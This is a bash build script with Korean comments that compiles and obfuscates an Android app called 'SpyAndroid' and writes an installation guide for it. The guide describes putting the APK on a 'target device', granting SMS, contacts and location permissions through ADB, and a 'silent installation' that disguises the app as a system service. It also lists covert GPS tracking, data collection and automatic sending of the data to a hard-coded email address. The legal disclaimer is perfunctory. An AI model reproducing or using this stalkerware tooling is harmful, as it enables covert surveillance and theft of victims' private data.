#!/bin/bash

# 🔥 Advanced Android Spyware APK 빌드 스크립트 (수정된 버전)
# 실행 방법: chmod +x build_apk.sh && ./build_apk.sh

echo "🔥 Starting Advanced Spyware APK Build Process..."

# 색상 정의
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# 오류 발생시 스크립트 중단
set -e

# 1. 환경 확인
echo -e "${BLUE}📋 Checking build environment...${NC}"

# Flutter 설치 확인
if ! command -v flutter &> /dev/null; then
    echo -e "${RED}❌ Flutter is not installed or not in PATH${NC}"
    exit 1
fi

# Android SDK 확인
if [ -z "$ANDROID_HOME" ]; then
    echo -e "${YELLOW}⚠️  ANDROID_HOME not set. Trying to detect...${NC}"
    # 일반적인 Android SDK 경로들 확인
    for path in "$HOME/Android/Sdk" "$HOME/Library/Android/sdk" "/opt/android-sdk"; do
        if [ -d "$path" ]; then
            export ANDROID_HOME="$path"
            echo -e "${GREEN}✅ Found Android SDK at: $ANDROID_HOME${NC}"
            break
        fi
    done

    if [ -z "$ANDROID_HOME" ]; then
        echo -e "${RED}❌ Android SDK not found${NC}"
        exit 1
    fi
fi

# 2. Flutter 버전 확인 및 업그레이드
echo -e "${BLUE}🔄 Checking Flutter version...${NC}"
flutter --version
flutter upgrade --force

# 3. 의존성 정리 및 재설치
echo -e "${BLUE}📦 Cleaning and installing dependencies...${NC}"
flutter clean
flutter pub get

# 4. Android 빌드 캐시 정리
echo -e "${BLUE}🧹 Cleaning Android build cache...${NC}"
rm -rf android/.gradle/
rm -rf android/build/
rm -rf build/

# 5. Gradle 래퍼 권한 설정
echo -e "${BLUE}🔧 Setting up Gradle permissions...${NC}"
chmod +x android/gradlew

# 6. 코드 생성 (필요한 경우)
echo -e "${BLUE}🔧 Generating code if needed...${NC}"
if [ -f "pubspec.yaml" ] && grep -q "build_runner" pubspec.yaml; then
    flutter packages pub run build_runner build --delete-conflicting-outputs || echo "No code generation needed"
fi

# 7. Android 빌드 최적화 설정
echo -e "${BLUE}⚙️  Optimizing Android build settings...${NC}"

# Gradle 메모리 설정
cat > android/gradle.properties << 'EOF'
org.gradle.jvmargs=-Xmx8G -XX:MaxMetaspaceSize=4G -XX:ReservedCodeCacheSize=1G -XX:+HeapDumpOnOutOfMemoryError -Dfile.encoding=UTF-8
org.gradle.daemon=true
org.gradle.parallel=true
org.gradle.configureondemand=true
android.useAndroidX=true
android.enableJetifier=true
android.enableR8.fullMode=true
EOF

# 8. 먼저 디버그 빌드로 컴파일 오류 확인
echo -e "${BLUE}🔍 Testing debug build first...${NC}"
flutter build apk --debug || {
    echo -e "${RED}❌ Debug build failed. Checking for common issues...${NC}"

    # 일반적인 문제들 해결 시도
    echo -e "${YELLOW}🔧 Attempting to fix common issues...${NC}"

    # 1. 오래된 의존성 제거
    flutter pub deps --no-dev

    # 2. Android 설정 재생성
    cd android
    ./gradlew clean
    cd ..

    # 3. 재시도
    flutter build apk --debug || {
        echo -e "${RED}❌ Debug build still failing. Please check the error messages above.${NC}"
        exit 1
    }
}

echo -e "${GREEN}✅ Debug build successful. Proceeding with release builds...${NC}"

# 9. 릴리즈 APK 빌드
echo -e "${BLUE}📱 Building Release APK...${NC}"
flutter build apk \
    --release \
    --shrink \
    --obfuscate \
    --split-debug-info=build/app/outputs/symbols \
    --target-platform android-arm,android-arm64

# 10. APK 파일 정리 및 복사
echo -e "${BLUE}📁 Organizing APK files...${NC}"

# 출력 디렉토리 생성
OUTPUT_DIR="build/spy_apks"
mkdir -p "$OUTPUT_DIR"

# 빌드된 APK들 복사
RELEASE_APK="build/app/outputs/flutter-apk/app-release.apk"
if [ -f "$RELEASE_APK" ]; then
    cp "$RELEASE_APK" "$OUTPUT_DIR/SpyAndroid_Universal_v1.0.apk"
    echo -e "${GREEN}✅ Universal APK: $OUTPUT_DIR/SpyAndroid_Universal_v1.0.apk${NC}"
fi

# ABI별 APK들도 복사
for abi in arm64-v8a armeabi-v7a; do
    APK_FILE="build/app/outputs/flutter-apk/app-$abi-release.apk"
    if [ -f "$APK_FILE" ]; then
        cp "$APK_FILE" "$OUTPUT_DIR/SpyAndroid_${abi}_v1.0.apk"
        echo -e "${GREEN}✅ ABI APK ($abi): $OUTPUT_DIR/SpyAndroid_${abi}_v1.0.apk${NC}"
    fi
done

# 11. APK 정보 출력
echo -e "${BLUE}📊 APK Information:${NC}"
for apk in "$OUTPUT_DIR"/*.apk; do
    if [ -f "$apk" ]; then
        size=$(du -h "$apk" | cut -f1)
        echo -e "${YELLOW}  📱 $(basename "$apk") - Size: $size${NC}"

        # APK 정보 분석 (aapt가 있는 경우)
        if command -v aapt &> /dev/null; then
            package_name=$(aapt dump badging "$apk" 2>/dev/null | grep package | awk '{print $2}' | sed "s/name='\(.*\)'/\1/" || echo "unknown")
            version=$(aapt dump badging "$apk" 2>/dev/null | grep versionName | awk '{print $3}' | sed "s/versionName='\(.*\)'/\1/" || echo "1.0.0")
            echo -e "     📦 Package: $package_name"
            echo -e "     🔢 Version: $version"
        fi
        echo ""
    fi
done

# 12. 설치 가이드 생성
echo -e "${BLUE}📋 Generating installation guide...${NC}"
cat > "$OUTPUT_DIR/INSTALLATION_GUIDE.md" << 'EOF'
# 🔥 Advanced Android Spyware - Installation Guide

## 📱 APK Files Description

### 1. SpyAndroid_Universal_v1.0.apk (RECOMMENDED)
- **Purpose**: Universal compatibility for all Android devices
- **Features**: Works on all ARM architectures (32-bit and 64-bit)
- **Target**: General deployment

### 2. ABI-specific APKs (Optimized)
- **arm64-v8a**: Modern 64-bit ARM devices (2018+) - Smaller size, better performance
- **armeabi-v7a**: Older 32-bit ARM devices (2012-2018)

## 🎯 Installation Steps

### Method 1: Direct Installation
1. Transfer APK to target device
2. Enable "Unknown Sources" in device settings
3. Install APK and grant all permissions
4. App will start monitoring automatically

### Method 2: ADB Installation (Physical Access)
```bash
adb install SpyAndroid_Universal_v1.0.apk
# Grant permissions programmatically
adb shell pm grant com.example.spy_android android.permission.ACCESS_FINE_LOCATION
adb shell pm grant com.example.spy_android android.permission.READ_SMS
adb shell pm grant com.example.spy_android android.permission.READ_CONTACTS
```

### Method 3: Silent Installation (Root Required)
```bash
# Copy to system partition (requires root)
adb push SpyAndroid_Universal_v1.0.apk /system/app/SystemService.apk
adb shell chmod 644 /system/app/SystemService.apk
adb reboot
```

## ⚙️ Configuration

### Email Service Setup
1. Sign up for EmailJS (emailjs.com)
2. Create email service and template
3. Update constants in EmailService.dart:
   - `_serviceId`
   - `_templateId`
   - `_publicKey`

### Alternative: Formspree Setup
1. Sign up for Formspree (formspree.io)
2. Get form endpoint
3. Update `_backupApiUrl` in EmailService.dart

## 📊 Monitoring Features

- ✅ GPS Location tracking (every 10 minutes)
- ✅ System data collection (every 15 minutes)
- ✅ Automatic data transmission (every 30 minutes)
- ✅ Emergency alerts
- ✅ Self-preservation mechanisms

## 🔧 Troubleshooting

### Permission Issues
```bash
# Grant all permissions via ADB
adb shell pm grant com.example.spy_android android.permission.ACCESS_FINE_LOCATION
adb shell pm grant com.example.spy_android android.permission.ACCESS_BACKGROUND_LOCATION
adb shell pm grant com.example.spy_android android.permission.READ_EXTERNAL_STORAGE
```

### Build Issues
- Ensure Android SDK 34 is installed
- Use Java 17 or higher
- Clean build: `flutter clean && flutter pub get`

## 🚨 Legal Disclaimer

This software is for educational and authorized security testing purposes only.
Unauthorized use may violate local laws. Use responsibly and only with proper authorization.

---
Build Date: $(date)
Version: 1.0.0
Target Email: tmdals7205@gmail.com
EOF

# 13. 최종 검증
echo -e "${BLUE}🔍 Final verification...${NC}"

# APK 서명 확인
for apk in "$OUTPUT_DIR"/*.apk; do
    if [ -f "$apk" ] && command -v jarsigner &> /dev/null; then
        if jarsigner -verify "$apk" > /dev/null 2>&1; then
            echo -e "${GREEN}✅ $(basename "$apk") is properly signed${NC}"
        else
            echo -e "${RED}❌ $(basename "$apk") signature verification failed${NC}"
        fi
    fi
done

# 14. 성공 메시지
echo ""
echo -e "${GREEN}🎉 BUILD COMPLETED SUCCESSFULLY! 🎉${NC}"
echo ""
echo -e "${YELLOW}📁 Output Directory: $OUTPUT_DIR${NC}"
echo -e "${YELLOW}📱 Universal APK: SpyAndroid_Universal_v1.0.apk${NC}"
echo -e "${YELLOW}📧 Email Target: tmdals7205@gmail.com${NC}"
echo ""
echo -e "${BLUE}🔧 Next Steps:${NC}"
echo -e "  1. Configure email services in lib/services/email_service.dart"
echo -e "  2. Test APK on development device first"
echo -e "  3. Deploy to target device"
echo -e "  4. Monitor email for incoming data"
echo ""
echo -e "${RED}⚠️  Remember: Use only for authorized testing and legal purposes!${NC}"

# 15. 선택적 기능들
echo ""
read -p "🧹 Do you want to clean temporary build files? (y/n): " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    echo -e "${BLUE}🧹 Cleaning temporary files...${NC}"
    rm -rf build/app/intermediates
    rm -rf android/.gradle/
    echo -e "${GREEN}✅ Cleanup completed${NC}"
fi

echo ""
echo -e "${GREEN}🚀 Build Process Complete! 🚀${NC}"
exit 0